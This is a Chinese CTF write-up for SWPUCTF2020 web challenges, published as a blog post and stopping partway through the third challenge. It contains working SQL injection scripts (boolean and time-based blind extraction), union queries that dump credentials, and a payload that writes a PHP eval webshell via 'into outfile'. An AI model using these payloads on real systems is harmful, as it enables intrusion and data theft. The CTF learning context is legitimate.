@@ -1,0 +1,611 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>SWPUCTF2020-WEB复现wp - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="SWPUCTF2020-WEB复现wp">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-12-10 15:59" pubdate>
+        2020年12月10日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      26
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SWPUCTF2020-WEB复现wp</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年12月15日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h1 id="1-359度防护网站"><a href="#1-359度防护网站" class="headerlink" title="1.359度防护网站"></a>1.359度防护网站</h1><h2 id="1-非预期解"><a href="#1-非预期解" class="headerlink" title="1.非预期解"></a>1.非预期解</h2><p>当时做这题的时候,发现注入点直接用<code>load_file</code>将<code>flag</code>给解出来了.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://182.150.46.187:8802/moe.php?id=2&#x27;</span><span class="hljs-comment">#目标url</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    high = <span class="hljs-number">127</span><br>    low = <span class="hljs-number">32</span><br>    mid = (low + high) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> high&gt;low:<br>        payload=<span class="hljs-string">&quot;-1&#x27;||if(ascii(substr((select load_file(&#x27;/flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br><br>        old_time = time.time()<br>        response = requests.get(url+payload)<br>        <span class="hljs-comment"># print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;capture the flag&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            low = mid + <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br><br>        mid = (low+high) // <span class="hljs-number">2</span><br><br>    result += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(mid))<br>    print(result)<br><span class="hljs-comment">#LTLT</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/1.png" srcset="/img/loading.gif"></p>
+<h2 id="2-预期解"><a href="#2-预期解" class="headerlink" title="2.预期解"></a>2.预期解</h2><p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/2.png" srcset="/img/loading.gif"></p>
+<p>在上面非预期的sql注入点，有部分过滤（但感觉有些过滤是像<code>union，select</code>单个不过滤，但是<code>union select</code>过滤）</p>
+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/3.png" srcset="/img/loading.gif"></p>
+<p>在用dirsearch扫路径的时候，拿到了<code>index.php.bak</code></p>
+<p>獲得base64加密后的请求包，解码后可以看到如下信息。</p>
+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/4.png" srcset="/img/loading.gif"></p>
+<p>可以想到是注入，可以发现联合注入可以使用，可以知道在这个页面基本没有防护。</p>
+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/5.png" srcset="/img/loading.gif"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union+select+1,2,3,database()--+</span><br><span class="hljs-string">#Database:LTLT</span><br><span class="hljs-string"></span><br><span class="hljs-string">-1&#x27;</span><span class="hljs-keyword">union</span><span class="hljs-operator">+</span><span class="hljs-keyword">select</span><span class="hljs-operator">+</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,(<span class="hljs-keyword">select</span><span class="hljs-operator">+</span>group_concat(table_name)<span class="hljs-keyword">from</span><span class="hljs-operator">+</span>information_schema.tables<span class="hljs-operator">+</span><span class="hljs-keyword">where</span><span class="hljs-operator">+</span>table_schema<span class="hljs-operator">=</span>database())<span class="hljs-comment">--+</span><br>#LTLT.tables:login,news<br><br><br><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union+select+1,2,3,(select+group_concat(column_name)from+information_schema.columns+where+table_name=&#x27;</span>login<span class="hljs-string">&#x27;)--+</span><br><span class="hljs-string">#login.columns:id,usn,pwd</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=-1&#x27;</span><span class="hljs-keyword">union</span><span class="hljs-operator">+</span><span class="hljs-keyword">select</span><span class="hljs-operator">+</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,(<span class="hljs-keyword">select</span><span class="hljs-operator">+</span>group_concat(usn,<span class="hljs-number">0x7e</span>,pwd)<span class="hljs-keyword">from</span><span class="hljs-operator">+</span>login)<span class="hljs-comment">--+</span><br>#admin123<span class="hljs-operator">~</span>f1097380e513e86f2c1548cc1094bf4e<br>md5解码：wllm<span class="hljs-variable">@123</span><br><br></code></pre></td></tr></table></figure>
+<p>进到后台得到了提示：</p>
+<p><code>http://182.150.46.187:8802/writeuser_00001_log.log</code></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs css">/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:00001</span>/<span class="hljs-selector-tag">time</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:21</span><span class="hljs-selector-pseudo">:21</span><span class="hljs-selector-pseudo">:16</span>/<span class="hljs-selector-tag">ip</span><span class="hljs-selector-pseudo">:127.0.0.1</span>/<span class="hljs-selector-tag">view</span><span class="hljs-selector-pseudo">:wife.html</span><br>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:00001</span>/<span class="hljs-selector-tag">time</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:21</span><span class="hljs-selector-pseudo">:21</span><span class="hljs-selector-pseudo">:20</span>/<span class="hljs-selector-tag">ip</span><span class="hljs-selector-pseudo">:127.0.0.1</span>/<span class="hljs-selector-tag">view</span><span class="hljs-selector-pseudo">:daqi.html</span><br>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:00001</span>/<span class="hljs-selector-tag">time</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:21</span><span class="hljs-selector-pseudo">:22</span><span class="hljs-selector-pseudo">:33</span>/<span class="hljs-selector-tag">ip</span><span class="hljs-selector-pseudo">:127.0.0.1</span>/<span class="hljs-selector-tag">view</span><span class="hljs-selector-pseudo">:jiayou.html</span><br>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:00001</span>/<span class="hljs-selector-tag">time</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:21</span><span class="hljs-selector-pseudo">:25</span><span class="hljs-selector-pseudo">:16</span>/<span class="hljs-selector-tag">ip</span><span class="hljs-selector-pseudo">:127.0.0.1</span>/<span class="hljs-selector-tag">view</span><span class="hljs-selector-pseudo">:administrator.html</span><br>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:00001</span>/<span class="hljs-selector-tag">time</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:21</span><span class="hljs-selector-pseudo">:29</span><span class="hljs-selector-pseudo">:16</span>/<span class="hljs-selector-tag">ip</span><span class="hljs-selector-pseudo">:127.0.0.1</span>/<span class="hljs-selector-tag">view</span><span class="hljs-selector-pseudo">:daqi.html</span><br>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:00001</span>/<span class="hljs-selector-tag">time</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:22</span><span class="hljs-selector-pseudo">:21</span><span class="hljs-selector-pseudo">:16</span>/<span class="hljs-selector-tag">ip</span><span class="hljs-selector-pseudo">:127.0.0.1</span>/<span class="hljs-selector-tag">view</span><span class="hljs-selector-pseudo">:meo.php</span><br>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:00001</span>/<span class="hljs-selector-tag">time</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:23</span><span class="hljs-selector-pseudo">:21</span><span class="hljs-selector-pseudo">:16</span>/<span class="hljs-selector-tag">ip</span><span class="hljs-selector-pseudo">:127.0.0.1</span>/<span class="hljs-selector-tag">view</span><span class="hljs-selector-pseudo">:mess.php</span><br>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:00001</span>/<span class="hljs-selector-tag">time</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:24</span><span class="hljs-selector-pseudo">:23</span><span class="hljs-selector-pseudo">:14</span>/<span class="hljs-selector-tag">ip</span><span class="hljs-selector-pseudo">:127.0.0.1</span>/<span class="hljs-selector-tag">view</span><span class="hljs-selector-pseudo">:ecy.php</span><br>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:00001</span>/<span class="hljs-selector-tag">time</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:26</span><span class="hljs-selector-pseudo">:21</span><span class="hljs-selector-pseudo">:33</span>/<span class="hljs-selector-tag">ip</span><span class="hljs-selector-pseudo">:127.0.0.1</span>/<span class="hljs-selector-tag">view</span><span class="hljs-selector-pseudo">:home.php</span><br>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:00001</span>/<span class="hljs-selector-tag">time</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:27</span><span class="hljs-selector-pseudo">:21</span><span class="hljs-selector-pseudo">:56</span>/<span class="hljs-selector-tag">ip</span><span class="hljs-selector-pseudo">:127.0.0.1</span>/<span class="hljs-selector-tag">view</span><span class="hljs-selector-pseudo">:index.php</span><br>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:00001</span>/<span class="hljs-selector-tag">time</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:27</span><span class="hljs-selector-pseudo">:23</span><span class="hljs-selector-pseudo">:16</span>/<span class="hljs-selector-tag">ip</span><span class="hljs-selector-pseudo">:127.0.0.1</span>/<span class="hljs-selector-tag">view</span><span class="hljs-selector-pseudo">:up_lo_ad_ad_min.php</span><br>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:00001</span>/<span class="hljs-selector-tag">time</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:28</span><span class="hljs-selector-pseudo">:22</span><span class="hljs-selector-pseudo">:26</span>/<span class="hljs-selector-tag">ip</span><span class="hljs-selector-pseudo">:127.0.0.1</span>/<span class="hljs-selector-tag">view</span><span class="hljs-selector-pseudo">:mess.php</span><br>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:00001</span>/<span class="hljs-selector-tag">time</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:28</span><span class="hljs-selector-pseudo">:25</span><span class="hljs-selector-pseudo">:26</span>/<span class="hljs-selector-tag">ip</span><span class="hljs-selector-pseudo">:127.0.0.1</span>/<span class="hljs-selector-tag">view</span><span class="hljs-selector-pseudo">:404.html</span><br>/<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:00001</span>/<span class="hljs-selector-tag">time</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:29</span><span class="hljs-selector-pseudo">:19</span><span class="hljs-selector-pseudo">:16</span>/<span class="hljs-selector-tag">ip</span><span class="hljs-selector-pseudo">:127.0.0.1</span>/<span class="hljs-selector-tag">view</span><span class="hljs-selector-pseudo">:admin.php</span><br></code></pre></td></tr></table></figure>
+<p>发现一个可疑的页面<code>up_lo_ad_ad_min.php</code></p>
+<p>发现需要密码，最多只能输入五位数。</p>
+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/6.png" srcset="/img/loading.gif"></p>
+<p>从前面泄露的log文件，猜测这个是密码：<code>user:00001</code></p>
+<p>有个文件上传的页面</p>
+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/7.png" srcset="/img/loading.gif"></p>
+<p>到这里，我就一直绕不过去了，就没看了，毕竟非预期比较香/xk。</p>
+<p>看了wp，发现前面注入的时候会有一个<code>h1nt</code>库。</p>
+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/8.png" srcset="/img/loading.gif"></p>
+<p>注入出一个页面地址<code>last_index_come_on_swpu_ctf.php?id=4</code></p>
+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/9.png" srcset="/img/loading.gif"></p>
+<p>可以发现在该页面也有注入点，同时基本没有防护的。同时，我们在文件上传正常图片的时候，知道了一个有可写权限的目录。</p>
+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/10.png" srcset="/img/loading.gif"></p>
+<p>尝试使用<code>into outfile</code>来写入webshell。</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">/last_index_come_on_swpu_ctf.php?id=-4%27union+select+1,2,3,&#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span>+@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27;into+outfile+&#x27;/var/www/html/upl_oad_pat_h/shell.php&#x27;--+</span><br></code></pre></td></tr></table></figure>
+<h1 id="2-sqlsql"><a href="#2-sqlsql" class="headerlink" title="2.sqlsql"></a>2.sqlsql</h1><h4 id="需要注意的点-官方的wp"><a href="#需要注意的点-官方的wp" class="headerlink" title="需要注意的点(官方的wp)"></a>需要注意的点(官方的wp)</h4><blockquote>
+<ol>
+<li>用异或来闭合引号</li>
+<li>case when then else end来替代if</li>
+<li>用join多个大表造成延时</li>
+<li>通过mysql5.7的sys.schema_table_statistics_with_buffer表查询表名</li>
+<li>通过无列名注入获取字段内容</li>
+<li>通过括号，或者引号包裹来代替空格</li>
+<li>flllag表有两个字段且flag值在第二个字段</li>
+<li>通过like或者regexp来匹配结果（但是这里不能用like，师傅们结合flag内容具体想想，卖个关子）</li>
+</ol>
+</blockquote>
+<p>可以发现SQL语句，那应该是和SQL注入有关了。经过提示，大概率和盲注有关。</p>
+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/11.png" srcset="/img/loading.gif"></p>
+<p>经过FUZZ，可以发现有如下的关键字被过滤了</p>
+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/12.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/13.png" srcset="/img/loading.gif"></p>
+<p>其中空格可以用小括号来分割语句解决，逗号被过滤了所以<code>if</code>也无法使用，但是可以用<code>case when then else end</code>，<code>information_schema</code>被过滤，可以用<code>sys.schema_table_statistics_with_buffer</code>来代替。</p>
+<p>同时可以用<code>join</code>多个大表来造成延迟注入。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">182.150</span><span class="hljs-number">.46</span><span class="hljs-number">.187</span>:<span class="hljs-number">8801</span><span class="hljs-operator">/</span>ttttt<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;^(select(case&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;when((select(select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema=database()))regexp&quot;flllag&quot;))then&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;else(select(count(*))from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))end))^&#x27;</span><span class="hljs-number">1</span><br><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">182.150</span><span class="hljs-number">.46</span><span class="hljs-number">.187</span>:<span class="hljs-number">8801</span><span class="hljs-operator">/</span>ttttt<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;^(select(case&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;when((select(select(database()))regexp&quot;c&quot;))then&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;else(select(count(*))from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))end))^&#x27;</span><span class="hljs-number">1</span><br><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">182.150</span><span class="hljs-number">.46</span><span class="hljs-number">.187</span>:<span class="hljs-number">8801</span><span class="hljs-operator">/</span>ttttt<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;^(select(case&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;when((select(select(group_concat(`2`))from(select*from(select(1))as`a`join(select(2))as`b`union(select*from(flllag)))as`a`)regexp&quot;flag&#123;aaa&quot;))then&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;else(select(count(*))from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))end))^&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> urllib.parse<br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&#x27;Hm_lvt_896657cfd762627291ee7bf931a8b164=1607217134,1607586970; Hm_lpvt_896657cfd762627291ee7bf931a8b164=1607589750; PHPSESSID=p8q772ikr599k9jqi8039f41q4&#x27;</span><br>&#125;<br>dicts = <span class="hljs-string">&#x27;qwertyuioplkjhgfdsazxcvbnm_&#123;&#125;1234567890&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment">#cbgcce</span><br>    old_result = result<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dicts:<br>        old_result+=i<br>        url = <span class="hljs-string">&#x27;http://182.150.46.187:8801/ttttt/?id=&#x27;</span><br>        <span class="hljs-comment"># payload=&quot;1&#x27;^(select(case&#x27;1&#x27;when((select(select(database()))regexp\&quot;&#123;0&#125;\&quot;))then&#x27;1&#x27;else(select(count(*))from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))end))^&#x27;1&quot;.format(old_result)</span><br>        payload=<span class="hljs-string">&quot;1&#x27;^(select(case&#x27;1&#x27;when((select(select(group_concat(`2`))from(select*from(select(1))as`a`join(select(2))as`b`union(select*from(flllag)))as`a`)regexp\&quot;flag&#123;%s\&quot;))then&#x27;1&#x27;else(select(count(*))from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))end))^&#x27;1&quot;</span>%(old_result)<br>        url = url+payload<br>        old_time = datetime.datetime.now()<br>        response = requests.get(url,headers=headers)<br>        print(response.text)<br>        new_time = datetime.datetime.now()<br>        print(url)<br>        <span class="hljs-keyword">if</span> (new_time-old_time).seconds &gt; <span class="hljs-number">1.8</span> <span class="hljs-keyword">and</span> response.status_code == <span class="hljs-number">200</span>:<br>            old_result = result<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>                result = result+i<br>                print(result)<br>                <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+<h1 id="3-noobpy"><a href="#3-noobpy" class="headerlink" title="3.noobpy"></a>3.noobpy</h1><p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/15.png" srcset="/img/loading.gif"></p>
+<p>通过报错：</p>
+<p>可以看到有<code>exec()</code>，看来这应该是漏洞点了。</p>
+<p><img src="/2020/12/10/SWPUCTF2020-WEB%E5%A4%8D%E7%8E%B0wp/16.png" srcset="/img/loading.gif"></p>
+<p>尝试构造反弹shell，发现有白名单的检查过滤。过滤了小括号，</p>
+<p>穿了<code>left=whitelist;1&amp;right=1</code>，可以看到白名单</p>
